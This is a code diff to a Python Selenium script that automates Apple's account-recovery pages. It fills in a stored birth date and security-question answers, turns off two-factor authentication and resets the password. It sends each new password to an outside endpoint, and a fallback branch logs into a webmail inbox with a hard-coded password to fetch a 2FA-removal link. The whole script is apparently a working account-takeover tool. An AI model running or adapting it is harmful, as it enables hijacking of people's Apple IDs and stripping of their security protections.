@@ -12,8 +12,8 @@ import time
 
 DOB = 
 delay = 10
-QUES = 
-ANS =
+QUES = []
+ANS = []
 
 chromedriver = r"C:\Users\Abdul13\Desktop\chromedriver.exe"
 service = Service(chromedriver)
@@ -81,41 +81,91 @@ while True:
 
     elif msg == "Confirm your phone number.":
         print("Apple ID Has 2FA")
-        WebDriverWait(driver, delay).until(EC.presence_of_element_located((By.XPATH,'/html/body/div[1]/iforgot-v2/app-container/div/iforgot-body/hsa-two-v2/recovery-web-app/idms-flow/div/div/trusted-phone-number/div/div/div[1]/idms-step/div/div/div/div[2]/div/div/div/button')))
-        driver.find_element(by=By.XPATH,value="/html/body/div[1]/iforgot-v2/app-container/div/iforgot-body/hsa-two-v2/recovery-web-app/idms-flow/div/div/trusted-phone-number/div/div/div[1]/idms-step/div/div/div/div[2]/div/div/div/button").click()
-        WebDriverWait(driver, delay).until(EC.presence_of_element_located((By.XPATH,"//*/text()[normalize-space(.)='Turn Off']/parent::*")))
-        driver.find_element(by=By.XPATH,value="//*/text()[normalize-space(.)='Turn Off']/parent::*").click()
-        WebDriverWait(driver, delay).until(EC.presence_of_element_located((By.XPATH,'/html/body/div[1]/iforgot-v2/app-container/div/iforgot-body/hsa-two-v2/recovery-web-app/idms-flow/div/div/verify-birthday/div/div/div[1]/idms-step/div/div/div/div[2]/div/form-fragment-birthday/masked-date/div/idms-error-wrapper/div/div/input')))
-        driver.find_element(by=By.XPATH,value="/html/body/div[1]/iforgot-v2/app-container/div/iforgot-body/hsa-two-v2/recovery-web-app/idms-flow/div/div/verify-birthday/div/div/div[1]/idms-step/div/div/div/div[2]/div/form-fragment-birthday/masked-date/div/idms-error-wrapper/div/div/input").send_keys(DOB)
-        driver.find_element(by=By.XPATH,value="/html/body/div[1]/iforgot-v2/app-container/div/iforgot-body/hsa-two-v2/recovery-web-app/idms-flow/div/div/verify-birthday/div/div/div[1]/idms-step/div/div/div/div[3]/idms-toolbar/div/div/div/button[1]").click()
-        WebDriverWait(driver, delay).until(EC.presence_of_element_located((By.XPATH,"/html/body/div[1]/iforgot-v2/app-container/div/iforgot-body/hsa-two-v2/recovery-web-app/idms-flow/div/div/verify-security-questions/div/div/div/step-challenge-security-questions/idms-step/div/div/div/div[2]/div/div[1]/div/label")))
-        q1 = driver.find_element(by=By.XPATH,value="/html/body/div[1]/iforgot-v2/app-container/div/iforgot-body/hsa-two-v2/recovery-web-app/idms-flow/div/div/verify-security-questions/div/div/div/step-challenge-security-questions/idms-step/div/div/div/div[2]/div/div[1]/div/label").get_attribute("innerHTML")
-        q2 = driver.find_element(by=By.XPATH,value="/html/body/div[1]/iforgot-v2/app-container/div/iforgot-body/hsa-two-v2/recovery-web-app/idms-flow/div/div/verify-security-questions/div/div/div/step-challenge-security-questions/idms-step/div/div/div/div[2]/div/div[2]/div/label").get_attribute("innerHTML")
-        time.sleep(3)
-        for q in  range(len(QUES)):
-            if q1 == QUES[q]:
-                driver.find_element(by=By.XPATH,value="/html/body/div[1]/iforgot-v2/app-container/div/iforgot-body/hsa-two-v2/recovery-web-app/idms-flow/div/div/verify-security-questions/div/div/div/step-challenge-security-questions/idms-step/div/div/div/div[2]/div/div[1]/div/div/idms-textbox/idms-error-wrapper/div/div/input").send_keys(ANS[q])
-            if q2 == QUES[q]:
-                driver.find_element(by=By.XPATH,value="/html/body/div[1]/iforgot-v2/app-container/div/iforgot-body/hsa-two-v2/recovery-web-app/idms-flow/div/div/verify-security-questions/div/div/div/step-challenge-security-questions/idms-step/div/div/div/div[2]/div/div[2]/div/div/idms-textbox/idms-error-wrapper/div/div/input").send_keys(ANS[q])
-        driver.find_element(by=By.XPATH,value="/html/body/div[1]/iforgot-v2/app-container/div/iforgot-body/hsa-two-v2/recovery-web-app/idms-flow/div/div/verify-security-questions/div/div/div/step-challenge-security-questions/idms-step/div/div/div/div[3]/idms-toolbar/div/div/div/button[1]").click()
-        WebDriverWait(driver, delay).until(EC.presence_of_element_located((By.XPATH,"/html/body/div[1]/iforgot-v2/app-container/div/iforgot-body/hsa-two-v2/recovery-web-app/idms-flow/div/div/recovery-unenroll-prompt/div/div/div/div/idms-step/div/div/div/div[3]/idms-toolbar/div/div/div/button[1]")))
-        driver.find_element(by=By.XPATH,value="/html/body/div[1]/iforgot-v2/app-container/div/iforgot-body/hsa-two-v2/recovery-web-app/idms-flow/div/div/recovery-unenroll-prompt/div/div/div/div/idms-step/div/div/div/div[3]/idms-toolbar/div/div/div/button[1]").click()
-        pwEnd = ""
-        for i in range(4):
-            letter = random.choice(string.ascii_lowercase)
-            pwEnd = pwEnd + letter
-        pw = "https://pixelpaste.net/A2/" + pwEnd
-        pseudoPost = requests.get(f"np={pw}")
-        time.sleep(3)
-        WebDriverWait(driver , delay).until(EC.presence_of_element_located((By.XPATH,"/html/body/div[1]/iforgot-v2/app-container/div/iforgot-body/hsa-two-v2/recovery-web-app/idms-flow/div/div/reset-password/div/div/div/div[1]/idms-password/idms-step/div/div/div/div[2]/div/div[1]/div/div[1]/div/new-password/div/idms-textbox/idms-error-wrapper/div/div/input")))
-        driver.find_element(by=By.XPATH,value="/html/body/div[1]/iforgot-v2/app-container/div/iforgot-body/hsa-two-v2/recovery-web-app/idms-flow/div/div/reset-password/div/div/div/div[1]/idms-password/idms-step/div/div/div/div[2]/div/div[1]/div/div[1]/div/new-password/div/idms-textbox/idms-error-wrapper/div/div/input").send_keys(pw)
-        driver.find_element(by=By.XPATH,value="/html/body/div[1]/iforgot-v2/app-container/div/iforgot-body/hsa-two-v2/recovery-web-app/idms-flow/div/div/reset-password/div/div/div/div[1]/idms-password/idms-step/div/div/div/div[2]/div/div[1]/div/div[2]/div/confirm-password-input/div/idms-textbox/idms-error-wrapper/div/div/input").send_keys(pw)
-        time.sleep(3)
-        driver.find_element(by=By.CLASS_NAME,value="button-primary").click()
-        driver.find_element(by=By.CLASS_NAME, value="button-primary").click()
-        WebDriverWait(driver, delay).until(EC.presence_of_element_located((By.XPATH, "//*/text()[normalize-space(.)='Turn Off']/parent::*")))
-        driver.find_element(by=By.XPATH,value="//*/text()[normalize-space(.)='Turn Off']/parent::*").click()
-        time.sleep(3)
-        print("2FA Removed")
-        driver.quit()
+        try:
+            WebDriverWait(driver, delay).until(EC.presence_of_element_located((By.XPATH,'/html/body/div[1]/iforgot-v2/app-container/div/iforgot-body/hsa-two-v2/recovery-web-app/idms-flow/div/div/trusted-phone-number/div/div/div[1]/idms-step/div/div/div/div[2]/div/div/div/button')))
+            driver.find_element(by=By.XPATH,value="/html/body/div[1]/iforgot-v2/app-container/div/iforgot-body/hsa-two-v2/recovery-web-app/idms-flow/div/div/trusted-phone-number/div/div/div[1]/idms-step/div/div/div/div[2]/div/div/div/button").click()
+            WebDriverWait(driver, delay).until(EC.presence_of_element_located((By.XPATH,"//*/text()[normalize-space(.)='Turn Off']/parent::*")))
+            driver.find_element(by=By.XPATH,value="//*/text()[normalize-space(.)='Turn Off']/parent::*").click()
+            WebDriverWait(driver, delay).until(EC.presence_of_element_located((By.XPATH,'/html/body/div[1]/iforgot-v2/app-container/div/iforgot-body/hsa-two-v2/recovery-web-app/idms-flow/div/div/verify-birthday/div/div/div[1]/idms-step/div/div/div/div[2]/div/form-fragment-birthday/masked-date/div/idms-error-wrapper/div/div/input')))
+            driver.find_element(by=By.XPATH,value="/html/body/div[1]/iforgot-v2/app-container/div/iforgot-body/hsa-two-v2/recovery-web-app/idms-flow/div/div/verify-birthday/div/div/div[1]/idms-step/div/div/div/div[2]/div/form-fragment-birthday/masked-date/div/idms-error-wrapper/div/div/input").send_keys(DOB)
+            driver.find_element(by=By.XPATH,value="/html/body/div[1]/iforgot-v2/app-container/div/iforgot-body/hsa-two-v2/recovery-web-app/idms-flow/div/div/verify-birthday/div/div/div[1]/idms-step/div/div/div/div[3]/idms-toolbar/div/div/div/button[1]").click()
+            WebDriverWait(driver, delay).until(EC.presence_of_element_located((By.XPATH,"/html/body/div[1]/iforgot-v2/app-container/div/iforgot-body/hsa-two-v2/recovery-web-app/idms-flow/div/div/verify-security-questions/div/div/div/step-challenge-security-questions/idms-step/div/div/div/div[2]/div/div[1]/div/label")))
+            q1 = driver.find_element(by=By.XPATH,value="/html/body/div[1]/iforgot-v2/app-container/div/iforgot-body/hsa-two-v2/recovery-web-app/idms-flow/div/div/verify-security-questions/div/div/div/step-challenge-security-questions/idms-step/div/div/div/div[2]/div/div[1]/div/label").get_attribute("innerHTML")
+            q2 = driver.find_element(by=By.XPATH,value="/html/body/div[1]/iforgot-v2/app-container/div/iforgot-body/hsa-two-v2/recovery-web-app/idms-flow/div/div/verify-security-questions/div/div/div/step-challenge-security-questions/idms-step/div/div/div/div[2]/div/div[2]/div/label").get_attribute("innerHTML")
+            time.sleep(3)
+            for q in  range(len(QUES)):
+                if q1 == QUES[q]:
+                    driver.find_element(by=By.XPATH,value="/html/body/div[1]/iforgot-v2/app-container/div/iforgot-body/hsa-two-v2/recovery-web-app/idms-flow/div/div/verify-security-questions/div/div/div/step-challenge-security-questions/idms-step/div/div/div/div[2]/div/div[1]/div/div/idms-textbox/idms-error-wrapper/div/div/input").send_keys(ANS[q])
+                if q2 == QUES[q]:
+                    driver.find_element(by=By.XPATH,value="/html/body/div[1]/iforgot-v2/app-container/div/iforgot-body/hsa-two-v2/recovery-web-app/idms-flow/div/div/verify-security-questions/div/div/div/step-challenge-security-questions/idms-step/div/div/div/div[2]/div/div[2]/div/div/idms-textbox/idms-error-wrapper/div/div/input").send_keys(ANS[q])
+            driver.find_element(by=By.XPATH,value="/html/body/div[1]/iforgot-v2/app-container/div/iforgot-body/hsa-two-v2/recovery-web-app/idms-flow/div/div/verify-security-questions/div/div/div/step-challenge-security-questions/idms-step/div/div/div/div[3]/idms-toolbar/div/div/div/button[1]").click()
+            WebDriverWait(driver, delay).until(EC.presence_of_element_located((By.XPATH,"/html/body/div[1]/iforgot-v2/app-container/div/iforgot-body/hsa-two-v2/recovery-web-app/idms-flow/div/div/recovery-unenroll-prompt/div/div/div/div/idms-step/div/div/div/div[3]/idms-toolbar/div/div/div/button[1]")))
+            driver.find_element(by=By.XPATH,value="/html/body/div[1]/iforgot-v2/app-container/div/iforgot-body/hsa-two-v2/recovery-web-app/idms-flow/div/div/recovery-unenroll-prompt/div/div/div/div/idms-step/div/div/div/div[3]/idms-toolbar/div/div/div/button[1]").click()
+            pwEnd = ""
+            for i in range(4):
+                letter = random.choice(string.ascii_lowercase)
+                pwEnd = pwEnd + letter
+            pw = "https://pixelpaste.net/A2/" + pwEnd
+            pseudoPost = requests.get(f"np={pw}")
+            time.sleep(3)
+            WebDriverWait(driver , delay).until(EC.presence_of_element_located((By.XPATH,"/html/body/div[1]/iforgot-v2/app-container/div/iforgot-body/hsa-two-v2/recovery-web-app/idms-flow/div/div/reset-password/div/div/div/div[1]/idms-password/idms-step/div/div/div/div[2]/div/div[1]/div/div[1]/div/new-password/div/idms-textbox/idms-error-wrapper/div/div/input")))
+            driver.find_element(by=By.XPATH,value="/html/body/div[1]/iforgot-v2/app-container/div/iforgot-body/hsa-two-v2/recovery-web-app/idms-flow/div/div/reset-password/div/div/div/div[1]/idms-password/idms-step/div/div/div/div[2]/div/div[1]/div/div[1]/div/new-password/div/idms-textbox/idms-error-wrapper/div/div/input").send_keys(pw)
+            driver.find_element(by=By.XPATH,value="/html/body/div[1]/iforgot-v2/app-container/div/iforgot-body/hsa-two-v2/recovery-web-app/idms-flow/div/div/reset-password/div/div/div/div[1]/idms-password/idms-step/div/div/div/div[2]/div/div[1]/div/div[2]/div/confirm-password-input/div/idms-textbox/idms-error-wrapper/div/div/input").send_keys(pw)
+            time.sleep(3)
+            driver.find_element(by=By.CLASS_NAME,value="button-primary").click()
+            driver.find_element(by=By.CLASS_NAME, value="button-primary").click()
+            WebDriverWait(driver, delay).until(EC.presence_of_element_located((By.XPATH, "//*/text()[normalize-space(.)='Turn Off']/parent::*")))
+            driver.find_element(by=By.XPATH,value="//*/text()[normalize-space(.)='Turn Off']/parent::*").click()
+            time.sleep(3)
+            print("2FA Removed")
+            driver.quit()
 
+        except:
+            driver = webdriver.Chrome(service=service, options=options)
+            driver.get("https://mail.hostinger.com")
+            response = requests.get("")
+            data = response.json()
+            apple_id = data["apple"]
+            driver.find_element(by=By.ID, value="rcmloginuser").send_keys(apple_id)
+            driver.find_element(by=By.ID, value="rcmloginpwd").send_keys("Krevory123@")
+            driver.find_element(by=By.ID, value="rcmloginsubmit").click()
+            WebDriverWait(driver, delay).until(EC.presence_of_element_located((By.CLASS_NAME, 'message')))
+            time.sleep(3)
+            driver.find_element(by=By.CLASS_NAME, value="message").click()
+            driver.find_element(by=By.CLASS_NAME, value="message").click()
+            time.sleep(3)
+            WebDriverWait(driver, delay).until(EC.presence_of_element_located((By.CSS_SELECTOR, 'p a')))
+            twoFaUrl = driver.find_element(by=By.CSS_SELECTOR, value="p a")
+            removeTwoFA_url = twoFaUrl.get_attribute("href")
+            driver.quit()
+            driver = webdriver.Chrome(service=service, options=options)
+            driver.get(removeTwoFA_url)
+            time.sleep(3)
+            WebDriverWait(driver, delay).until(EC.presence_of_element_located((By.XPATH,
+                                                                               "/html/body/div[1]/iforgot-v2/app-container/div/iforgot-body/hsa-two-v2/recovery-web-app/idms-flow/div/div/recovery-unenroll-prompt/div/div/div/div/idms-step/div/div/div/div[3]/idms-toolbar/div/div/div/button[1]")))
+            driver.find_element(by=By.XPATH,
+                                value="/html/body/div[1]/iforgot-v2/app-container/div/iforgot-body/hsa-two-v2/recovery-web-app/idms-flow/div/div/recovery-unenroll-prompt/div/div/div/div/idms-step/div/div/div/div[3]/idms-toolbar/div/div/div/button[1]").click()
+            pwEnd = ""
+            for i in range(4):
+                letter = random.choice(string.ascii_lowercase)
+                pwEnd = pwEnd + letter
+            pw = "https://pixelpaste.net/A2/" + pwEnd
+            pseudoPost = requests.get(f"?np={pw}")
+            time.sleep(3)
+            WebDriverWait(driver, delay).until(EC.presence_of_element_located((By.XPATH,
+                                                                               "/html/body/div[1]/iforgot-v2/app-container/div/iforgot-body/hsa-two-v2/recovery-web-app/idms-flow/div/div/reset-password/div/div/div/div[1]/idms-password/idms-step/div/div/div/div[2]/div/div[1]/div/div[1]/div/new-password/div/idms-textbox/idms-error-wrapper/div/div/input")))
+            driver.find_element(by=By.XPATH,
+                                value="/html/body/div[1]/iforgot-v2/app-container/div/iforgot-body/hsa-two-v2/recovery-web-app/idms-flow/div/div/reset-password/div/div/div/div[1]/idms-password/idms-step/div/div/div/div[2]/div/div[1]/div/div[1]/div/new-password/div/idms-textbox/idms-error-wrapper/div/div/input").send_keys(
+                pw)
+            driver.find_element(by=By.XPATH,
+                                value="/html/body/div[1]/iforgot-v2/app-container/div/iforgot-body/hsa-two-v2/recovery-web-app/idms-flow/div/div/reset-password/div/div/div/div[1]/idms-password/idms-step/div/div/div/div[2]/div/div[1]/div/div[2]/div/confirm-password-input/div/idms-textbox/idms-error-wrapper/div/div/input").send_keys(
+                pw)
+            time.sleep(3)
+            driver.find_element(by=By.CLASS_NAME, value="button-primary").click()
+            driver.find_element(by=By.CLASS_NAME, value="button-primary").click()
+            WebDriverWait(driver, delay).until(
+                EC.presence_of_element_located((By.XPATH, "//*/text()[normalize-space(.)='Turn Off']/parent::*")))
+            driver.find_element(by=By.XPATH, value="//*/text()[normalize-space(.)='Turn Off']/parent::*").click()
+            time.sleep(3)
+            print("2FA Removed")
+            driver.quit()
